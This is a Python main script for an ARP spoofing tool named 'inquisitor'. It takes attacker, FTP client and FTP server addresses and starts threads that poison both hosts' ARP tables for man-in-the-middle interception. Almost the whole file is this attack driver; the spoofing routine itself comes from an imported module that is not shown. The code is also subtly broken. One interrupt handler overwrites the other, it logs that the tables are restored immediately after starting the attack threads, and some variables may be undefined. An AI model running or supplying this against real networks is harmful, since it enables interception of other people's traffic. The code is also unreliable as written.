"""Python software for ARP spoofing"""
import signal
import sys
from threading import Thread
from src.config import ConfigLibrary
from src.logger import Logger as inquisitor_logger
from src.spoofer import Arpspoofer

def handler(self):
    """function reacts when ctrl-c is pressed"""
    self.logger("restoring arp tables")

def main():
    """main function for arp spoofing"""
    inq_config = ConfigLibrary()
    inq_logger = inquisitor_logger("inquisitor")
    inq_logger.set_log_level(inq_config.get_log_level())

    try:
        args, unknown = inq_config.parser.parse_known_args()
    except SystemExit:
        return

    if unknown:
        inq_logger.logger.error('invalid args')
        return
    if args.ip_spoofer:
        ip_spoofer = args.ip_spoofer
    if args.mac_spoofer:
        mac_spoofer = args.mac_spoofer
    if args.ip_server:
        ip_server = args.ip_server
    if args.mac_server:
        mac_server = args.mac_server
    if args.ip_client:
        ip_client = args.ip_client
    if args.mac_client:
        mac_client = args.mac_client
    if not args.verbose:
        inq_logger.set_log_level('NOTSET')
        inq_logger.logger.propagate = False

    #spoofing arp tables
    inq_logger.logger.info("spoofing ftp client arp tables")
    client_spoof = Arpspoofer(ip_spoofer, mac_spoofer, ip_client, mac_client, ip_server, inq_logger)
    inq_logger.logger.info("spoofing ftp server arp tables")
    server_spoof = Arpspoofer(ip_spoofer, mac_spoofer, ip_server, mac_server, ip_client, inq_logger)

    #handling ctrl-c input
    signal.signal(signal.SIGINT, client_spoof.handler)
    signal.signal(signal.SIGINT, server_spoof.handler)

    #running spoofing
    client_spoof_thread = Thread(target=client_spoof.run)
    server_spoof_thread = Thread(target=server_spoof.run)
    client_spoof_thread.start()
    server_spoof_thread.start()

    inq_logger.logger.info("spoofing ftp client and server arp tables restored")
    sys.exit(0)

if __name__ == "__main__":
    main()
